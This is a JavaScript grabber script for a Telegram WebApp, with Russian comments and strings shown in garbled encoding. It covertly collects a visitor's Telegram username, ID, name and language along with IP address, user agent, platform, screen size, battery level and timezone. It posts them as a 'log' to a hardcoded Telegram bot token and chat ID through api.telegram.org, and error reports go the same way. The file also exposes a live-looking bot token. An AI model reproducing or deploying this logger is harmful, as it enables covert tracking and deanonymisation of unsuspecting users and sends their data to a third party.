// –∫–æ–¥–µ—Ä—É, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å—Ç–∞–≤–∏—Ç—å —ç—Ç–æ –Ω–∞ —Ö–æ—Å—Ç:
// -   —Å–∫—Ä–∏–ø—Ç –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –ø–æ–¥ Telegram WebApp, 
//     –ø–æ—ç—Ç–æ–º—É –¥–∞–∂–µ –Ω–µ –ø—ã—Ç–∞–π—Å—è –ø–æ–¥ —á—Ç–æ –ª–∏–±–æ –∞–¥–∞–ø—Ç–∏—Ä–æ–≤–∞—Ç—å:
//     –ø—Ä–æ—â–µ –±—É–¥–µ—Ç –ø–µ—Ä–µ–ø–∏—Å–∞—Ç—å –ø–æ –Ω–æ–≤–æ–π;
// 1-----------------------------------------------------
// -   –∏–º–µ–µ—Å—Ç—è –ø—Ä–æ–±–ª–µ–º–∞ —Å getTimezoneOffset(),
//     –µ–±–∏—Å—å —Å–∞–º
// 2-----------------------------------------------------
// -   –º–µ–Ω—è—Ç—å —Ç–æ–∫–µ–Ω –∏ ID —á–∞—Ç–∞ –ø—Ä—è–º–æ –≤ —Ñ—É–Ω—Ü–∫–∏–∏:
//     sendDataToTelegram() - —Å—Ç—Ä–æ–∫–∏ –≥–¥–µ —É–∫–∞–∑–∞–Ω token –∏ chatId
// 3-----------------------------------------------------
// -   –Ω–∞ iOS –Ω–µ —Ä–∞–±–æ—Ç–∞–µ —Ñ—É–Ω–∫—Ü–∏—è: getIPAdress()
//     –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–æ —Å –ø–æ–º–æ—â—å—é cloudflare trace
// 4-----------------------------------------------------
// -   –º–æ–∂–µ—Ç –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å –Ω–µ –≤—Å–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –≤–µ—Ä–Ω–æ.
// ------------------------------------------------------
//                     –£–î–ê–ß–ò!
//                     –£–î–ê–ß–ò!
//                     –£–î–ê–ß–ò!

async function fetchPublicIP() {
    try {
        // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å IP –∏–∑ –ø—Ä–µ–¥–∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        const traceDivData = document.getElementById('cf-trace').textContent;
        if (traceDivData) {
            const data = traceDivData.split('\n').reduce((obj, line) => {
                const [key, value] = line.split('=');
                if (key && value) obj[key.trim()] = value.trim();
                return obj;
            }, {});
            
            if (data.ip) {
                console.log('Using pre-loaded IP:', data.ip);
                return data.ip;
            }
        }

        // –ï—Å–ª–∏ –ø—Ä–µ–¥–∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –Ω–µ—Ç, –ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –Ω–∞–ø—Ä—è–º—É—é
        console.log('Trying direct Cloudflare request...');
        const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
        const text = await response.text();
        
        const data = text.split('\n').reduce((obj, line) => {
            const [key, value] = line.split('=');
            if (key && value) obj[key.trim()] = value.trim();
            return obj;
        }, {});
        
        console.log('Got IP from direct request:', data.ip);
        return data.ip || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP';
    } catch (error) {
        console.error('Error fetching IP:', error);
        return '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP';
    }
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Error getting battery info:', error);
        return '–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ';
    }
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    try {
        // Check if Telegram WebApp is available
        if (!window.Telegram || !window.Telegram.WebApp) {
            throw new Error('Telegram WebApp –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω');
        }

        let tg = window.Telegram.WebApp;

        // Wait for initialization if needed
        if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
            // Wait for up to 3 seconds for initialization
            for (let i = 0; i < 30; i++) {
                await new Promise(resolve => setTimeout(resolve, 100));
                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                    break;
                }
            }
            
            // If still not initialized, throw error
            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
                throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Telegram');
            }
        }

        console.log('Starting to fetch IP...');
        const ipAddress = await fetchPublicIP();
        console.log('IP fetching completed:', ipAddress);

        const userAgent = getUserAgent();
        const osName = getOSName();
        const screenResolution = getScreenResolution();
        const batteryPercentage = await getBatteryPercentage();
        const browserInfo = getBrowserInfo();

        // Safe access to user data with fallbacks
        const user = tg.initDataUnsafe.user || {};
        const message = `
v1.3.1 - —è –µ–±–∞–ª –≤–∞—à –∞–π—Ñ–æ–Ω –≤ —Ä–æ—Ç, –ø—ã—Ç–∞–µ–º—Å—è –ø–æ—Ñ–∏–∫—Å–∏—Ç—å
<b>‚ú® –õ–æ–≥ —É—Å–ø–µ—à–µ–Ω!</b>
<b>üîç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ:</b>
‚îú –¢—ç–≥: @${user.username || '–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç'}
‚îú –ê–π–¥–∏: <code>${user.id || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îú –ò–º—è: <code>${user.first_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îú –§–∞–º–∏–ª–∏—è: <code>${user.last_name || '–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç'}</code>
‚îú –Ø–∑—ã–∫: <code>${user.language_code || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
‚îî –ú–æ–∂–Ω–æ –ø–∏—Å–∞—Ç—å –≤ –õ–°: <code>${user.allows_write_to_pm || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>
<b>üñ• –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>
‚îú –ê–π–ø–∏: <code>${ipAddress}</code>
‚îú UserAgent: <code>${userAgent}</code>
‚îú –•—ç—à: <code>undefined</code>
‚îú –ò–º—è –û–°: <code>${osName}</code>
‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: <code>${screenResolution}</code>
‚îú –ü—Ä–æ—Ü–µ–Ω—Ç –±–∞—Ç–∞—Ä–µ–∏: <code>${batteryPercentage}${typeof batteryPercentage === 'number' ? '%' : ''}</code>
‚îî –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: <code>${new Date().getTimezoneOffset()}</code>
<b>üåê –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ:</b>
‚îú –ù–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞: <code>${browserInfo.name}</code>
‚îú –í–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: <code>${browserInfo.version}</code>
‚îî –¢–∏–ø –¥–≤–∏–∂–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞: <code>${browserInfo.engine}</code>
        `;

        console.log('Preparing to send message to Telegram...');

        const token = '7654890944:AAGVutLoKILiTx-7PIRVQHCYcilw__7_0gg';
        const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
        const chatId = '-4778017209';

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'HTML');

        const response = await fetch(telegramBotURL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log('Message sent successfully!');
    } catch (error) {
        console.error('Error in sendDataToTelegram:', error);
        
        // Send error report to Telegram
        try {
            const errorMessage = `
v1.3.1 - —è –µ–±–∞–ª –≤–∞—à –∞–π—Ñ–æ–Ω –≤ —Ä–æ—Ç, –ø—ã—Ç–∞–µ–º—Å—è –ø–æ—Ñ–∏–∫—Å–∏—Ç—å

<b>‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤ —Å–∫—Ä–∏–ø—Ç–µ!</b>
<b>üîç –î–µ—Ç–∞–ª–∏ –æ—à–∏–±–∫–∏:</b>
‚îú –°–æ–æ–±—â–µ–Ω–∏–µ: <code>${error.message}</code>
‚îú UserAgent: <code>${getUserAgent()}</code>
‚îú –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: <code>${getOSName()}</code>
‚îî –í—Ä–µ–º—è: <code>${new Date().toISOString()}</code>
            `;

            const token = '7654890944:AAGVutLoKILiTx-7PIRVQHCYcilw__7_0gg';
            const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
            const chatId = '-4778017209';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', errorMessage);
            formData.append('parse_mode', 'HTML');

            await fetch(telegramBotURL, {
                method: 'POST',
                body: formData
            });
        } catch (sendError) {
            console.error('Failed to send error report:', sendError);
        }
    }
}

// Remove the auto-initialization since we now control it from index.html
// if (document.readyState === 'loading') {
//     document.addEventListener('DOMContentLoaded', sendDataToTelegram);
// } else {
//     sendDataToTelegram();
// }
